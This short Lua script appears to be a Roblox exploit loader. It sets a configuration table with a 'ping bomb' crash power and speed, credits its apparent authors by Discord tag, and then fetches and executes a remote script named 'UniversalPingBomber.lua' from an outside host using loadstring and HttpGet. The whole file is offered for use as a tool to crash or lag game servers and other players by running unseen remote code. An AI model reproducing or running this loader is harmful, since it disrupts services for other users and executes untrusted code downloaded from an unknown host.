getrenv().Config = {
    ["PingBombPower"] = 3, --// Crash Power From 1 - 10
    ["PingBombSpeed"] = 1.5, --// Wait Per Ping Bomb
    ["FD"] = true, --// FD#6666
    ["wxp"] = true --// wxp#0001
}
--// It Will Take About 10 Seconds To Load
loadstring(game:HttpGet('https://fourdevils.gq/UniversalPingBomber.lua'))()
